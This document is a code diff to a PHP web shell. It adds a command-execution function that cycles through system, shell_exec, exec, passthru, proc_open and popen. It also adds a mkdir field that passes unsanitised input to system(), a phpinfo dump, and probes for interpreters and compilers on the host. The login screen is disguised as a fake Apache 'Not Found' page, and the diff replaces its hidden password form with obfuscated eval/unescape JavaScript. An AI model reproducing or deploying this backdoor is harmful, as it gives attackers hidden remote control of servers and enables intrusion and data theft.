@@ -38,7 +38,7 @@ on the container's size */
 background-size: cover;
 /* Set a background color that will be displayed
 while the background image is loading */
-background-color: #464646;
+background-color: #464646 ;
 }
 p{
 font-size:14px;
@@ -241,6 +241,67 @@ function actionSecInfo() {
 //Disable Function
 $disable_functions = @ini_get('disable_functions');
 
+//Execute Function
+
+if(!function_exists('execute')){
+	function execute($code){
+		$output = "";
+		$code = $code." 2>&1";
+
+		if(is_callable('system') && function_exists('system')){
+			ob_start();
+			@system($code);
+			$output = ob_get_contents();
+			ob_end_clean();
+			if(!empty($output)) return $output;
+		}
+		elseif(is_callable('shell_exec') && function_exists('shell_exec')){
+			$output = @shell_exec($code);
+			if(!empty($output)) return $output;
+		}
+		elseif(is_callable('exec') && function_exists('exec')){
+			@exec($code,$res);
+			if(!empty($res)) foreach($res as $line) $output .= $line;
+			if(!empty($output)) return $output;
+		}
+		elseif(is_callable('passthru') && function_exists('passthru')){
+			ob_start();
+			@passthru($code);
+			$output = ob_get_contents();
+			ob_end_clean();
+			if(!empty($output)) return $output;
+		}
+		elseif(is_callable('proc_open') && function_exists('proc_open')){
+			$desc = array(
+				0 => array("pipe", "r"),
+				1 => array("pipe", "w"),
+				2 => array("pipe", "w"));
+			$proc = @proc_open($code, $desc, $pipes, getcwd(), array());
+			if(is_resource($proc)){
+				while($res = fgets($pipes[1])){
+					if(!empty($res)) $output .= $res;
+				}
+				while($res = fgets($pipes[2])){
+					if(!empty($res)) $output .= $res;
+				}
+			}
+			@proc_close($proc);
+			if(!empty($output)) return $output;
+		}
+		elseif(is_callable('popen') && function_exists('popen')){
+			$res = @popen($code, 'r');
+			if($res){
+				while(!feof($res)){
+					$output .= fread($res, 2096);
+				}
+				pclose($res);
+			}
+			if(!empty($output)) return $output;
+		}
+		return "";
+	}
+}
+
 // ================================
 // if user is logged in
 if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
@@ -248,6 +309,12 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 ?>
 
 <div class="overlay"></div>
+		<?php
+		if(isset($_GET['action']) & $_GET['action']=="phpinfo"){
+		die(phpinfo());
+		
+		}
+		?>
 	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
 		<tr>
 			<td>
@@ -321,26 +388,85 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 									echo ' Magic_quotes_gpc : <font color="yellow"> OFF </font> /';
 								}
 								//Check Wget
-								if(system('wget') == '1'){
-									echo ' Wget : <font color="red"> ON</font> / ';
+								$check = strtolower(execute("wget -h"));
+								if(strpos($check,"usage")!==false) $wget = "on";
+								if($wget == "on"){
+									echo ' Wget : <font color="green"> ON</font> / ';
 								}
 								else{
 									echo ' Wget : <font color="yellow"> OFF</font> / ';
 								}
-								//Check Wget
-								if(system('gcc') == '1'){
-									echo ' Gcc : <font color="red"> ON</font> / ';
+								//Check Gcc
+								$check = strtolower(execute("gcc --help"));
+								if(strpos($check,"usage")!==false) $gcc = "on";
+								if($gcc == "on"){
+									echo ' Gcc : <font color="green"> ON</font> / ';
 								}
 								else{
 									echo ' Gcc : <font color="yellow"> OFF</font> / ';
 								}
 								//Check Perl
-								if(system('perl') == '1'){
-									echo ' Perl : <font color="red"> ON</font> <br />';
+								$check = strtolower(execute("perl -h"));
+								if(strpos($check,"usage")!==false) $perl = "on";
+								if($perl == "on"){
+									echo ' Perl : <font color="green"> ON</font> / ';
 								}
 								else{
-									echo ' Perl : <font color="yellow"> OFF</font> <br /> ';
-								}									
+									echo ' Perl : <font color="yellow"> OFF</font> / ';
+								}
+								
+								//Check Python
+								$check = strtolower(execute("python -h"));
+								if(strpos($check,"usage")!==false) $python = "on";
+								if($python == "on"){
+									echo ' Python : <font color="green"> ON</font> / ';
+								}
+								else{
+									echo ' Python : <font color="yellow"> OFF</font> / ';
+								}
+								
+								//Check Ruby
+								$check = strtolower(execute("ruby -h"));
+								if(strpos($check,"usage")!==false) $ruby = "on";
+								if($ruby == "on"){
+									echo ' Ruby : <font color="green"> ON</font> / ';
+								}
+								else{
+									echo ' Ruby : <font color="yellow"> OFF</font> / ';
+								}
+								
+								//Check Node
+								$check = strtolower(execute("node -h"));
+								if(strpos($check,"usage")!==false) $node = "on";
+								if($node == "on"){
+									echo ' node : <font color="green"> ON</font> / ';
+								}
+								else{
+									echo ' node : <font color="yellow"> OFF</font> / ';
+								}
+								
+								//Check NodeJs
+								$check = strtolower(execute("nodejs -h"));
+								if(strpos($check,"usage")!==false) $nodejs = "on";
+								if($nodejs == "on"){
+									echo ' nodejs : <font color="green"> ON</font> / ';
+								}
+								else{
+									echo ' nodejs : <font color="yellow"> OFF</font> / ';
+								}
+								
+								//Check Java
+								$check = strtolower(execute("java -help"));
+								if(strpos($check,"usage")!==false){
+								$check = strtolower(execute("java -help"));
+								if(strpos($check,"usage")!==false) {$java = "on";
+								}}
+								if($java == "on"){
+									echo ' java : <font color="green"> ON</font> <br /> ';
+								}
+								else{
+									echo ' java : <font color="yellow"> OFF</font> <br /> ';
+								}																
 								?>
 								<?php
 
@@ -417,7 +543,6 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		echo "</td></tr>";
 		}
 		?>
-		
 		<tr>
 			<td style="font-size:14px;">
 			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
@@ -457,7 +582,15 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 					</tr>
 					<tr>
 						<td>
-							Make Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
+							<?php 
+						if(isset($_GET['mkdir'])){
+						system("mkdir ".$_GET['mkdir']);
+						echo " Created ";
+						}
+						?>
+							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
+							Make Dir : <br /><input type="text" placeholder="C:\xampp\htdocs\shell\namafolder" name="mkdir" value=""/> <input type="submit" name="submit" value="Send"/>
+						    </form>
 						</td>
 						<td>
 							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
@@ -516,18 +649,18 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 <?php
 }else{
 ?>
-<body style="margin:10px;background:#fff;color:#000;">
+<body style="margin:10px;background:#fff;color:#000;overflow:hidden;">
 <h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <hr>
 <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
-	<style>
-		input { margin:0;background-color:#fff;border:1px solid #fff; }
-	</style>
-	<center>
-	<form method="post" action="<?php $_SERVER['PHP_SELF'];?>" >
-	<input type="password" name="password" style="background:transparent;outline:none;border:none;color:#fff;">
-	</form></center>
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%61%61%61%34%34%34%61%64%33%34%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%38%35%30%31%34%32%33%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%38%36%33%37%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%61%61%61%61%34%34%34%61%64%33%34%28%27') + '%36%6f%6b%75%62%5c%37%03%09%06%03%67%65%62%69%6b%12%73%67%64%6d%68%6d%63%61%65%34%6c%5c%66%59%6b%62%6a%54%34%68%61%67%34%21%28%2f%26%67%6d%35%61%66%5d%58%6b%34%21%2c%35%26%67%6d%35%52%6a%6a%6d%66%6c%34%5b%59%5c%58%6e%64%63%34%67%5f%69%5b%65%65%34%26%32%5b%5f%52%64%5d%6e%66%69%60%5b%21%5b%66%61%61%61%37%19%5a%5d%58%37%59%63%68%5b%5e%6e%39%2e%64%68%17%6f%63%63%65%5a%17%18%5a%55%5b%31%10%74%01%04%00%36%27%6a%69%77%6b%5a%36%03%01%05%36%5a%59%64%6b%5e%6e%3d%02%02%07%33%58%63%69%61%16%64%5e%6c%57%60%58%33%19%62%63%6a%6e%18%17%5a%5d%63%66%65%62%34%1c%36%36%62%5e%67%15%1c%5e%4c%3f%4e%4d%39%4c%52%1b%46%3f%45%51%42%3a%40%3a%1e%51%37%36%30%18%17%37%03%09%06%30%67%65%62%69%6b%12%6a%70%65%5b%3c%1f%64%5f%6a%6f%6b%66%6c%5a%19%15%62%50%62%5f%33%19%62%5d%6a%6f%6f%66%6b%5c%11%11%69%6c%70%66%59%34%1c%58%58%58%65%56%6f%65%6b%65%5e%34%6b%6c%59%65%68%60%50%6f%5f%62%6b%37%63%6c%6e%62%60%67%5b%39%63%65%62%5c%37%5c%66%6c%5a%5c%6b%36%6d%60%66%5b%32%5f%63%63%63%68%31%18%5a%55%5b%31%1e%35%01%04%00%36%27%5d%64%6e%6c%33%30%21%5a%59%60%6b%59%68%3518501423%35%35%30%35%31%30%32' + unescape('%27%29%29%3b'));
+// -->
+</script>
+<noscript><i>Javascript required</i></noscript>
 <?php
 }
 ?>
